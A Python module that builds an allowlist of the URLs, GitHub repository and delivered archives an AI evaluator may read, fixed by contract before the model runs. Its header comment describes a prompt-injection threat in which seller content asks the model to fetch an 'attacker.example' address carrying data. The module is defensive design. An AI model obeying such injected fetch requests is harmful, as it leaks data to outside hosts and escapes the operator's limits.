# The allowlist: what the evaluator may read in this run, decided by code before the model runs
# (ADR-0019, piece 1).
#
# Why code decides and the model does not: the model reads the seller's content, and that
# content may ask it to fetch "https://attacker.example/?data=...". If the model could pick any
# address, a prompt injection would become a request to anywhere. Here the only hosts, the only
# repository and the only files are the ones the locked contract and the delivery name; a tool
# refuses everything else, whatever the model asks.
#
# Why sources from the contract filter the delivery: the parties approved which kinds of
# evidence count (ai-check sources). A delivery adds where to look, never what may be read.
import re
from collections.abc import Sequence
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import urlsplit

from settld_engine.contracts import AiCheckConfig, EvidenceLink

_GITHUB = re.compile(
    r"^https://github\.com/(?P<owner>[A-Za-z0-9_.-]+)/(?P<name>[A-Za-z0-9_.-]+?)(?:\.git)?(?:/.*)?$"
)
MAX_ARCHIVES = 5


def origin_of(url: str) -> str | None:
    """`https://host[:port]`, lowercase and without the default port; None if not https."""
    try:
        parts = urlsplit(url)
        port = parts.port
    except ValueError:
        return None
    if parts.scheme != "https" or not parts.hostname:
        return None
    host = parts.hostname.lower()
    return f"https://{host}" if port in (None, 443) else f"https://{host}:{port}"


@dataclass(frozen=True)
class RepoRef:
    owner: str
    name: str
    commit_sha: str

    @property
    def label(self) -> str:
        return f"{self.owner}/{self.name}@{self.commit_sha[:12]}"


@dataclass(frozen=True)
class ArchiveRef:
    file_hash: str
    path: Path
    label: str


@dataclass(frozen=True)
class Sources:
    origins: frozenset[str] = frozenset()
    entry_pages: list[str] = field(default_factory=list)
    repository: RepoRef | None = None
    archives: list[ArchiveRef] = field(default_factory=list)
    notes: str | None = None
    # Why a delivered item is not read, in English: it goes to the model as context, so it can
    # say "the repository could not be read" instead of judging as if it was never delivered.
    skipped: list[str] = field(default_factory=list)

    @property
    def readable(self) -> bool:
        """Something beyond notes: notes alone are a claim and can never pass."""
        return bool(self.entry_pages or self.repository or self.archives)


def _repository(
    config: AiCheckConfig, links: Sequence[EvidenceLink], skipped: list[str]
) -> RepoRef | None:
    for link in links:
        if link.kind != "REPOSITORY":
            continue
        match = _GITHUB.match(link.url)
        if match is None:
            skipped.append(f"{link.url}: only public GitHub repositories can be read")
            continue
        owner, name = match["owner"], match["name"]
        if config.repository and config.repository.lower() != f"{owner}/{name}".lower():
            skipped.append(f"{owner}/{name}: the contract names {config.repository} instead")
            continue
        if link.commit_sha is None:
            skipped.append(f"{owner}/{name}: no commit was fixed when it was delivered")
            continue
        return RepoRef(owner, name, link.commit_sha)
    return None


def resolve_sources(
    config: AiCheckConfig,
    links: Sequence[EvidenceLink],
    notes: str | None,
    deliveries_dir: Path,
) -> Sources:
    approved = set(config.sources)
    skipped: list[str] = []

    pages: list[str] = []
    if "HTTP_RESPONSE" in approved:
        candidates = [config.url] if config.url else []
        candidates += [link.url for link in links if link.kind == "URL"]
        for url in candidates:
            if url is None or url in pages:
                continue
            if origin_of(url) is None:
                skipped.append(f"{url}: only https addresses can be read")
                continue
            pages.append(url)
    origins = frozenset(o for o in (origin_of(u) for u in pages) if o is not None)

    repository = _repository(config, links, skipped) if "REPOSITORY" in approved else None

    archives: list[ArchiveRef] = []
    if "FILES" in approved:
        for link in links:
            if link.kind != "FILE" or link.file_hash is None or len(archives) >= MAX_ARCHIVES:
                continue
            digest = link.file_hash.removeprefix("sha256:")
            path = deliveries_dir / f"{digest}.zip"
            archives.append(ArchiveRef(link.file_hash, path, link.label or path.name))

    return Sources(
        origins=origins,
        entry_pages=pages,
        repository=repository,
        archives=archives,
        notes=notes if "NOTES" in approved and notes else None,
        skipped=skipped,
    )
